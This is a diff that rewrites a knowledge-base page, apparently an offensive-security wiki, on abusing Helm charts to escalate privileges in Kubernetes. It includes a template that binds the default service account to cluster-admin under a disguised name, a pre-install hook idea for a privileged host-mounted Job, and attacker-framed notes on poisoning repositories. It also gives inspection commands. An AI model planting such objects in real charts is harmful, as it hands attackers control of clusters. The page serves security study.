@@ -1,31 +1,52 @@
 ---
-title: "Helm chart abuse: deploying through a malicious or over-privileged chart"
-description: "Abusing Helm to run attacker workloads: installing a malicious or over-privileged chart, tampering with a chart in a repository so installs pull attacker content, or exploiting chart templating and hooks to create privileged pods and RBAC during a release."
+title: "Helm chart abuse: executing attacker objects through a chart"
+description: "A Helm chart is a template that renders into arbitrary cluster objects, applied with the installing identity's permissions. An attacker who can get a malicious or tampered chart installed, through a poisoned repository, a crafted chart, or hooks, has the chart create privileged pods, RBAC bindings, or backdoors at install time, inheriting the installer's rights rather than their own."
 keywords:
   - helm chart
+  - helm hooks
   - chart repository
-  - chart hooks
-  - over-privileged chart
-  - kubernetes supply chain
+  - supply chain
+  - privileged objects
 ---
 
 # Helm chart abuse
 
-Helm renders templates into Kubernetes objects and applies them with the installer's permissions. A chart can declare anything: privileged pods, hostPath volumes, cluster role bindings. Installing a malicious chart, tampering with one in a repository, or abusing chart hooks runs attacker-chosen objects through a trusted release.
+Helm renders a chart's templates into Kubernetes objects and applies them with the credentials of whoever runs the install, which in CI or GitOps is frequently a powerful service account. Nothing constrains what those objects are, so a malicious chart simply includes the objects an attacker wants: a privileged pod, a ClusterRoleBinding to `cluster-admin`, a backdoor DaemonSet. Delivery is through a poisoned or typosquatted chart repository, a tampered chart in a trusted repo, or chart hooks that run jobs at defined lifecycle points. Because the objects are created with the installer's rights, the attacker inherits those rights without holding them.
 
 ```bash
-# A chart that creates a privileged, host-mounting workload and a broad binding
-helm install audit ./chart        # templates expand to privileged pod + clusterrolebinding
-helm repo add x https://attacker/charts && helm install y x/legit   # poisoned repo
+helm repo list; helm search repo <name>                # configured repositories
+# inspect a chart's rendered objects before/without installing
+helm template ./chart | grep -iE 'ClusterRoleBinding|privileged|hostPath|hook'
+```
+
+## Malicious chart content
+
+```yaml
+# templates/backdoor.yaml rendered and applied with the installer's permissions
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata: { name: {{ .Release.Name }}-metrics }
+roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
+subjects:
+- { kind: ServiceAccount, name: default, namespace: {{ .Release.Namespace }} }
+```
+
+```yaml
+# a pre-install hook runs a Job before the rest, useful for one-shot actions
+annotations:
+  "helm.sh/hook": pre-install
+# the Job's pod can be privileged with a host mount, giving node access at install
 ```
 
 ## Exploitation notes
 
-- The objects a chart creates run with the installer's rights, so a CI or admin installing a crafted chart grants it their power.
-- Chart hooks run jobs at install or upgrade time, a convenient place to hide a one-shot escalation.
-- Tampering with an untrusted or unverified chart repository poisons every install that pulls from it.
+- The privilege comes from the installer, not the chart author, so the target is any pipeline or operator that installs charts with a strong identity; get your content into a chart it installs.
+- Hooks (`pre-install`, `post-install`) run Jobs at defined points and are an easy place to hide a one-shot privileged action that is less visible than a standing object.
+- Delivery mirrors the image supply chain: a poisoned or typosquatted repo, or a tampered chart in a trusted one; see [Base image poisoning](../../../runtimes/docker/images-and-registries/base-image-poisoning.md) for the analogous image route.
+- Inspect with `helm template` to see exactly what a chart renders before trusting it; attacker objects hide among legitimate ones.
 
 ## References
 
-- [Helm security](https://helm.sh/docs/topics/securing_installation/)
-- [Helm: chart hooks](https://helm.sh/docs/topics/charts_hooks/)
+- [Helm: charts and hooks](https://helm.sh/docs/topics/charts_hooks/)
+- [Helm: provenance and integrity](https://helm.sh/docs/topics/provenance/)
+- [SLSA: supply-chain threats](https://slsa.dev/spec/v1.0/threats)
